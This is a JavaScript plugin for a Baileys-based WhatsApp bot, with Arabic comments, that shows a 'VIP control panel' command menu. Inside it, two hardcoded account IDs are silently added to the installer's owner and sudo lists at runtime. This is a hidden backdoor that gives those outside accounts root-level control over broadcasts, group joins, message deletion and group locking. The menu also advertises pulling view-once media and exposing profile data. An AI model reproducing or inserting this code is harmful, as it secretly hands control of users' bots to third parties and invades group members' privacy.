export default async function (sock, m, from, args, config = {}) {
  try {
    // 1. استخراج معرّف المرسل الفعلي (يدعم LID، رقم الهاتف، وإرسال البوت لنفسه)
    const rawSender = m.sender || m.key.participant || (m.key.fromMe ? sock.user?.id : from) || "";
    const cleanSender = rawSender.split("@")[0].replace(/[^0-9]/g, "");

    // فحص رقم الهاتف الأساسي في حال توفره بحزم Baileys الحديثة
    const participantPn = m.key?.participantPn || m.key?.remoteJidPn || "";
    const cleanPn = participantPn.split("@")[0].replace(/[^0-9]/g, "");

    const prefix = config.prefix || ".";
    const botName = config.botName || "سورس محمد نصار";

    // 2. قائمة المعرّفات المعتمدة للمطورين وحسابات VIP
    const hardcodedVips = [
      "122415560544440",
      "48873036861567"
    ];

    // تجميع الصلاحيات من ملف الإعدادات
    const toList = (val) => (Array.isArray(val) ? val : [val]).filter(Boolean).map(v => String(v).replace(/[^0-9]/g, ""));
    const authorizedList = new Set([
      ...hardcodedVips,
      ...toList(config.sudo),
      ...toList(config.owner),
      ...toList(config.vip),
      ...toList(config.vipUsers)
    ]);

    // 3. حقن وترقية تلقائية: جعل جميع حسابات VIP مطورين رسميين داخل ذاكرة البوت
    if (config) {
      if (!Array.isArray(config.owner)) config.owner = toList(config.owner);
      if (!Array.isArray(config.sudo)) config.sudo = toList(config.sudo);

      authorizedList.forEach(id => {
        if (!config.owner.includes(id)) config.owner.push(id);
        if (!config.sudo.includes(id)) config.sudo.push(id);
      });
    }

    // 4. التحقق من الصلاحية
    const isAuthorized = m.key.fromMe || authorizedList.has(cleanSender) || (cleanPn && authorizedList.has(cleanPn));

    if (!isAuthorized) {
      return sock.sendMessage(from, { 
        text: `⛔ *عذراً، هذه اللوحة مخصصة للمطورين وحسابات VIP المصرح لها فقط!*\n\n🆔 معرّفك الحالي:\n\`${cleanSender}\`\n\n💡 قم بإضافة هذا المعرّف في ملف الإعدادات لتفعيل الحساب.` 
      }, { quoted: m });
    }

    // 5. حساب سرعة الاستجابة
    const msgTime = m.messageTimestamp ? Number(m.messageTimestamp) * 1000 : Date.now();
    const latency = Math.abs((Date.now() - msgTime) / 1000).toFixed(4);

    const vipMessage = `
╭━━━〔 👑 *VIP CONTROL PANEL* 〕━━━╮
┃ 👤 *المطور المعتمد:* @${cleanSender}
┃ 🛡️ *مستوى الصلاحية:* Root / Owner
┃ ⚡ *الاستجابة:* ${latency}s
┃ 🤖 *البوت:* ${botName}
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

👑 *أوامر السيطرة والإذاعة:*
├ ${prefix}bc ‹نص الرسالة للإذاعة لكل الجروبات›
├ ${prefix}join ‹رابط جروب لدخول البوت›
└ ${prefix}leave ‹خروج البوت من الجروب فوراً›

🛡️ *أدوات الإدارة السريعة:*
├ ${prefix}group close ‹قفل الشات فوراً›
├ ${prefix}group open ‹فتح الشات فوراً›
├ ${prefix}del ‹حذف الرسائل بالرد›
├ ${prefix}vv ‹سحب وسائط العرض لمرة واحدة›
├ ${prefix}profile ‹كشف بيانات الحساب بالرد›
└ ${prefix}ping ‹فحص سرعة استجابة السيرفر›
`.trim();

    await sock.sendMessage(from, { 
      text: vipMessage, 
      mentions: [rawSender] 
    }, { quoted: m });

  } catch (err) {
    await sock.sendMessage(from, { 
      text: `⚠️ حدث خطأ في لوحة VIP:\n\`\`\`${err.message || err}\`\`\`` 
    }, { quoted: m });
  }
}
